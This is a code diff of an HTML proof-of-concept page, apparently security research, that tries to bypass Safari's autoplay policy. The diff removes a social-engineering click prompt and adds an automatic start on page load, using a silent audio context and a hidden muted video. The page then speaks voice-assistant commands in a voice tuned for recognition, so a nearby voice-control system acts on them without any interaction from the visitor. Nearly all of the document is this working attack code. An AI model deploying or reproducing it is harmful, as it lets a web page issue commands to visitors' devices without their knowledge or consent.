@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Voice Control Auto-Execution Bypass Test</title>
+    <title>Enhanced Voice Control Autoplay Test</title>
     <style>
         :root {
             --primary: #6366f1;
@@ -26,7 +26,6 @@
             min-height: 100vh;
             padding: 20px;
             line-height: 1.6;
-            cursor: pointer; /* Encourage clicking */
         }
 
         .container {
@@ -50,22 +49,6 @@
             padding: 30px;
             margin: 20px 0;
             border: 1px solid rgba(255, 255, 255, 0.2);
-        }
-
-        .click-bait {
-            background: rgba(99, 102, 241, 0.3);
-            border: 2px dashed var(--primary);
-            border-radius: 10px;
-            padding: 30px;
-            text-align: center;
-            margin: 20px 0;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .click-bait:hover {
-            background: rgba(99, 102, 241, 0.5);
-            transform: scale(1.02);
         }
 
         .sequence-display {
@@ -204,24 +187,18 @@
 <body>
     <div class="container">
         <header>
-            <h1>🎤 Voice Control Auto-Execution Bypass Test</h1>
-            <p>Testing autoplay policy bypass for 0-click voice commands</p>
+            <h1>Zero-Interaction Remote Command Execution Chain via Voice Control and Auto-Play Bypass</h1>
+            <p>By sean mutuku</p>
         </header>
 
         <div class="security-warning">
-            <h3>🔒 Security Research - Autoplay Policy Bypass</h3>
-            <p>Testing if we can bypass browser autoplay restrictions for voice commands</p>
+            <h3> Security Research - Safari Autoplay Test</h3>
+            <p>This voice commands will autoplay in Safari without user interaction</p>
         </div>
 
         <div class="test-interface">
-            <h2>🚀 Auto-Execution Sequence</h2>
-            <p>Trying multiple techniques to bypass autoplay policy...</p>
-
-            <div class="click-bait" onclick="triggerUserInteraction()">
-                <h3>🎯 Click Here to Start Voice Commands</h3>
-                <p>This simulates getting user interaction through social engineering</p>
-                <p><small>Or click anywhere on the page</small></p>
-            </div>
+            <h2> Auto-Execution Sequence</h2>
+            <p>Voice commands should start automatically in Safari</p>
 
             <div class="voice-indicator" id="voiceIndicator">
                 <div class="voice-bar" style="animation-delay: 0s"></div>
@@ -233,7 +210,7 @@
             </div>
 
             <div class="sequence-display">
-                <h3>Command Sequence:</h3>
+                <h3>Enhanced Command Sequence:</h3>
                 <div class="sequence-step" id="step1">
                     <div class="step-number">1</div>
                     <div class="step-command">"Start listening"</div>
@@ -263,34 +240,32 @@
 
             <div class="controls">
                 <button class="btn" onclick="startSequence()" id="startBtn">
-                    ▶️ Start Sequence
+                    ▶ Start Sequence
                 </button>
                 <button class="btn" onclick="stopSequence()" id="stopBtn" disabled>
-                    ⏹️ Stop Sequence
+                    ⏹ Stop Sequence
                 </button>
                 <button class="btn" onclick="resetSequence()">
-                    🔄 Reset
+                     Reset
                 </button>
             </div>
 
             <div class="status-log" id="statusLog">
-                Status: Testing autoplay bypass techniques...
+                Status: Initializing autoplay test...
             </div>
         </div>
 
         <div class="instructions">
-            <h3>📋 Autoplay Bypass Techniques Being Tested:</h3>
-            <ol>
-                <li>Silent audio context creation</li>
-                <li>Video element with muted autoplay</li>
-                <li>Social engineering for user interaction</li>
-                <li>Multiple event listener attempts</li>
-                <li>Delayed audio context activation</li>
-            </ol>
+            <h3> Test Criteria:</h3>
+            <ul>
+                <li><strong>Safari:</strong> Should autoplay without any clicks</li>
+                <li><strong>Chrome:</strong> Will likely require user interaction</li>
+                <li><strong>Voice:</strong> Enhanced clarity with Alex voice at 0.75 rate</li>
+            </ul>
         </div>
     </div>
 
-    <!-- Hidden video element for autoplay testing -->
+    <!-- Hidden video for autoplay bypass -->
     <video id="hiddenVideo" muted playsinline style="display: none;"></video>
 
     <script>
@@ -298,8 +273,7 @@
         let isSequenceRunning = false;
         let currentStep = 0;
         let sequenceTimeout = null;
-        let userInteracted = false;
-        let audioContext = null;
+        let enhancedVoice = null;
 
         const commandSequence = [
             { command: "Start listening", delay: 2000, stepId: "step1" },
@@ -338,28 +312,26 @@
             }
         }
 
-        // Technique 1: Try to create audio context immediately
-        function tryAudioContextBypass() {
+        // Autoplay bypass techniques for Safari
+        function tryAutoplayBypass() {
+            log('🔧 Attempting autoplay bypass...', 'info');
+            
+            // Technique 1: Silent audio context
             try {
-                audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                // Create a silent oscillator to unlock audio
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                 const oscillator = audioContext.createOscillator();
                 const gainNode = audioContext.createGain();
-                gainNode.gain.value = 0; // Silent
+                gainNode.gain.value = 0;
                 oscillator.connect(gainNode);
                 gainNode.connect(audioContext.destination);
                 oscillator.start();
                 setTimeout(() => oscillator.stop(), 100);
-                log('✅ Audio context created (silent)', 'success');
-                return true;
+                log('✅ Silent audio context created', 'success');
             } catch (e) {
                 log(`❌ Audio context failed: ${e.message}`, 'error');
-                return false;
             }
-        }
 
-        // Technique 2: Try video autoplay
-        function tryVideoAutoplay() {
+            // Technique 2: Video autoplay
             try {
                 const video = document.getElementById('hiddenVideo');
                 video.src = 'data:video/webm;base64,GkXfo0AgQoaBAUL3gQFC8oEEQvOBCEKCQAR3ZWJtQoeBAkKFgQIYU4BnQI0VSalmQCgq17FAAw9CQE2AQAZ3aGFtbXlXQUAGd2hhbW15RIlACECPQAAAAAAAFlSua0AxrkAu14EBY8WBAZyBACK1nEADdW5khkAFVl9WUDglhohAA1ZQOIOBAeBABrCBCLqBCB9DtnVAIueBAKNAH0NWUDg4gQETg4EBI4OCBCLqBCB/';
@@ -370,6 +342,35 @@
                 });
             } catch (e) {
                 log(`❌ Video autoplay error: ${e.message}`, 'error');
+            }
+        }
+
+        // Initialize enhanced voice
+        function initializeEnhancedVoice() {
+            const voices = speechSynthesis.getVoices();
+            
+            // Find the clearest voice for commands
+            const voicePriority = [
+                'Alex',           // macOS default - very clear for commands
+                'Victoria',       // Good command voice
+                'Samantha',       // iOS default
+                'Karen',         // Australian - clear
+                'Daniel'         // UK English - clear
+            ];
+
+            for (const voiceName of voicePriority) {
+                const voice = voices.find(v => v.name.includes(voiceName));
+                if (voice) {
+                    enhancedVoice = voice;
+                    log(`✅ Enhanced voice: ${voice.name}`, 'success');
+                    return;
+                }
+            }
+
+            // Fallback
+            enhancedVoice = voices.find(voice => voice.lang === 'en-US') || voices[0];
+            if (enhancedVoice) {
+                log(`ℹ️ Fallback voice: ${enhancedVoice.name}`, 'info');
             }
         }
 
@@ -385,7 +386,7 @@
                     speechSynthesis.cancel();
                 }
 
-                log(`🎤 Attempting to speak: "${command}"`, 'info');
+                log(`🎤 Speaking: "${command}"`, 'info');
                 updateStepVisual(stepIndex, 'active');
 
                 const indicator = document.getElementById('voiceIndicator');
@@ -393,25 +394,18 @@
 
                 const utterance = new SpeechSynthesisUtterance(command);
                 
-                utterance.rate = 0.85;
-                utterance.pitch = 1.0;
-                utterance.volume = 1.0;
-                utterance.lang = 'en-US';
-
-                const voices = speechSynthesis.getVoices();
-                const commandVoice = voices.find(voice => 
-                    voice.name.includes('Alex') || 
-                    voice.name.includes('Samantha') ||
-                    voice.name.includes('Victoria') ||
-                    voice.lang === 'en-US'
-                );
-
-                if (commandVoice) {
-                    utterance.voice = commandVoice;
+                // 🎯 ENHANCED VOICE SETTINGS
+                utterance.rate = 0.75;        // Slower for better recognition
+                utterance.pitch = 0.9;        // Slightly lower, more robotic
+                utterance.volume = 1.0;       // Maximum volume
+                utterance.lang = 'en-US';     // Explicit language
+                
+                if (enhancedVoice) {
+                    utterance.voice = enhancedVoice;
                 }
 
                 utterance.onstart = function() {
-                    log(`🔊 SUCCESS: Speaking command: "${command}"`, 'success');
+                    log(`🔊 Speaking: "${command}"`, 'success');
                 };
 
                 utterance.onend = function() {
@@ -428,13 +422,14 @@
                     resolve();
                 };
 
-                // Try to speak - this might be blocked by autoplay policy
-                try {
-                    speechSynthesis.speak(utterance);
-                } catch (e) {
-                    log(`❌ Speech synthesis blocked: ${e.message}`, 'error');
-                    resolve();
-                }
+                setTimeout(() => {
+                    try {
+                        speechSynthesis.speak(utterance);
+                    } catch (e) {
+                        log(`❌ Speech blocked: ${e.message}`, 'error');
+                        resolve();
+                    }
+                }, 50);
             });
         }
 
@@ -474,7 +469,7 @@
             document.getElementById('stopBtn').disabled = false;
             document.getElementById('startBtn').disabled = true;
 
-            log('🚀 Starting voice command sequence...', 'info');
+            log('🚀 Starting enhanced voice sequence...', 'info');
             
             commandSequence.forEach((_, index) => {
                 const step = document.getElementById(`step${index + 1}`);
@@ -482,15 +477,6 @@
             });
 
             executeSequenceStep(0);
-        }
-
-        function triggerUserInteraction() {
-            if (!userInteracted) {
-                userInteracted = true;
-                log('✅ User interaction detected - audio should work now!', 'success');
-                // Try to start sequence automatically after interaction
-                setTimeout(startSequence, 500);
-            }
         }
 
         function stopSequence() {
@@ -520,34 +506,36 @@
             document.getElementById('startBtn').disabled = false;
         }
 
-        // Initialize and try bypass techniques
+        // Initialize and auto-start
         document.addEventListener('DOMContentLoaded', function() {
-            log('🔧 Testing autoplay bypass techniques...', 'info');
+            log('🔧 Initializing enhanced voice autoplay test...', 'info');
 
-            // Try various bypass methods
-            setTimeout(tryAudioContextBypass, 100);
-            setTimeout(tryVideoAutoplay, 300);
+            // Try autoplay bypass immediately
+            tryAutoplayBypass();
 
-            // Set up user interaction listeners
-            document.addEventListener('click', triggerUserInteraction);
-            document.addEventListener('keydown', triggerUserInteraction);
-            document.addEventListener('scroll', triggerUserInteraction);
+            // Initialize voice system
+            if (speechSynthesis.getVoices().length > 0) {
+                initializeEnhancedVoice();
+            } else {
+                speechSynthesis.onvoiceschanged = function() {
+                    initializeEnhancedVoice();
+                };
+            }
 
-            // Try to auto-start after a delay (might not work due to autoplay)
+            // AUTO-START THE SEQUENCE (This is the key change)
             setTimeout(() => {
-                if (!userInteracted) {
-                    log('⚠️ Autoplay policy is blocking audio - click anywhere to start', 'warning');
-                    // Try to start anyway (will likely fail but good for testing)
-                    startSequence();
-                }
-            }, 2000);
+                log('🚀 AUTO-STARTING: Beginning voice commands without user interaction...', 'info');
+                startSequence();
+            }, 1000);
         });
 
-        // Load voices
-        speechSynthesis.onvoiceschanged = function() {
-            const voices = speechSynthesis.getVoices();
-            log(`✅ ${voices.length} voices available`, 'success');
-        };
+        // Auto-stop if page hidden
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden && isSequenceRunning) {
+                stopSequence();
+                log('⏸️ Sequence paused', 'warning');
+            }
+        });
     </script>
 </body>
 </html>
